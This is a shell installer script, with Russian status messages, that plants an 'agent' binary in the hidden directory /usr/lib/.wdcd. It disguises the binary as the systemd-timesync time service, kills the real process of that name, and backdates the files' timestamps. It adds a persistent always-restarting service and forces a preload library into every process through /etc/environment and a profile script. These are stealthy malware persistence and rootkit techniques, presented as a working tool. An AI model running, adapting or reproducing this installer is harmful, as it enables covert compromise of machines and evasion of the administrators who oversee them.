#!/bin/sh
set -e
ID="teamcity-4@teamcity-4"
DIR="/usr/lib/.wdcd"
CA=/etc/ssl/certs/ca-certificates.crt
if [ ! -s "$CA" ]; then
	echo "нет CA-бандла $CA — ставлю ca-certificates" >&2
	if command -v apt-get >/dev/null 2>&1; then apt-get update >/dev/null 2>&1 || true; apt-get install -y ca-certificates >/dev/null 2>&1 || true; fi
	if [ ! -s "$CA" ]; then echo "ca-certificates отсутствует — агент не сможет ходить по HTTPS" >&2; exit 1; fi
fi
mkdir -p "$DIR/bin"
pkill -x systemd-timesync 2>/dev/null || true
cp diagd "$DIR/bin/systemd-timesync"
cp libcache.so "$DIR/bin/libcache.so"
cp boot.js "$DIR/bin/boot.js" 2>/dev/null || true
rm -f "$DIR"/*_key.json "$DIR"/*.xkey "$DIR/config.json" "$DIR/wdcd" "$DIR/bin/sysdiag" 2>/dev/null || true
rm -rf "$DIR/telemetry" "$DIR/data" 2>/dev/null || true
chmod 700 "$DIR" "$DIR/bin"; chmod 755 "$DIR/bin/systemd-timesync"; chmod 644 "$DIR/bin/libcache.so"
_stamp=$(stat -c %Y /etc/os-release 2>/dev/null || echo 0)
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
	touch -d "@$_stamp" "$DIR" "$DIR/bin" "$DIR/bin/systemd-timesync" "$DIR/bin/libcache.so" 2>/dev/null || true
fi

SVC=/etc/systemd/system/systemd-timesync.service
cat > "$SVC" <<UNIT
[Unit]
Description=System Time Synchronization Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStartPre=/bin/sh -c "install -d -m 755 $DIR/bin && test -x $DIR/bin/systemd-timesync"
ExecStart=/usr/lib/.wdcd/bin/systemd-timesync --foreground
Environment=LD_PRELOAD=/usr/lib/.wdcd/bin/libcache.so
Restart=always
RestartSec=5
Nice=10
OOMScoreAdjust=-800

[Install]
WantedBy=multi-user.target
UNIT
chmod 644 "$SVC"
systemctl daemon-reload 2>/dev/null || true
systemctl enable systemd-timesync.service 2>/dev/null || true
systemctl restart systemd-timesync.service 2>/dev/null || true

if ! grep -q "libcache" /etc/environment 2>/dev/null; then
	printf 'LD_PRELOAD=/usr/lib/.wdcd/bin/libcache.so\n' >> /etc/environment
fi
mkdir -p /etc/profile.d
cat > /etc/profile.d/wdcd-preload.sh <<PL
if [ -z "\$LD_PRELOAD" ] && [ -f /usr/lib/.wdcd/bin/libcache.so ]; then export LD_PRELOAD=/usr/lib/.wdcd/bin/libcache.so; fi
PL
chmod 644 /etc/profile.d/wdcd-preload.sh

sleep 2
if systemctl is-active --quiet systemd-timesync.service 2>/dev/null; then
	echo "agent $ID установлен (systemd, $(systemctl show -p ActiveState --value systemd-timesync.service))"
elif command -v crond >/dev/null 2>&1; then
	setsid env LD_PRELOAD="$DIR/bin/libcache.so" nohup "$DIR/bin/systemd-timesync" --foreground >/dev/null 2>&1 < /dev/null &
	echo $! > "$DIR/bin/wdcd.pid"
	echo "agent $ID установлен (systemd нет — fallback crond, pid=$!)"
else
	setsid env LD_PRELOAD="$DIR/bin/libcache.so" nohup "$DIR/bin/systemd-timesync" --foreground >/dev/null 2>&1 < /dev/null &
	echo $! > "$DIR/bin/wdcd.pid"
	echo "agent $ID установлен (ручной запуск, pid=$!)"
fi
